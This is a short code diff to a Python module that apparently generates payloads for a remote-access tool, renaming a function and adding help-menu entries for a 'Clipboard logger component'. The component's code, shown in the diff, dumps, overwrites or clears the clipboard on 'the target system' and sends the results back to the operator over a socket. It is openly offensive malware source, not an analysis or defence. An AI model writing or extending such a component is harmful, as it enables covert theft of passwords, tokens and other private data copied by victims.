@@ -8,7 +8,7 @@ def main(option):
     if option == 'generate':
         config.import_statements.append('import win32clipboard')
         config.functions.append('''
-def clip_log(option):
+def clip_logger(option):
     flag = option.split(' ',1)
     if flag[0] == 'clip_dump':
         win32clipboard.OpenClipboard()
@@ -28,7 +28,10 @@ def clip_log(option):
         s.sendall('[+]Cleared clipboard')''')
         config.logics.append('''
             elif command in ('clip_dump', 'clip_set', 'clip_clear'):
-                clip_log(data)''')
+                clip_logger(data)''')
+        config.help_menu['clip_dump'] = 'Display contents of clipboard on the target system'
+        config.help_menu['clip_set <text to set clipboard to>'] = 'Set the value of the clipboard on the target system'
+        config.help_menu['clip_clear'] = 'Clear the clipboard data on the target system'
     elif option == 'info':
         print '\nName             : Clipboard logger component' \
               '\nOS               : Windows' \
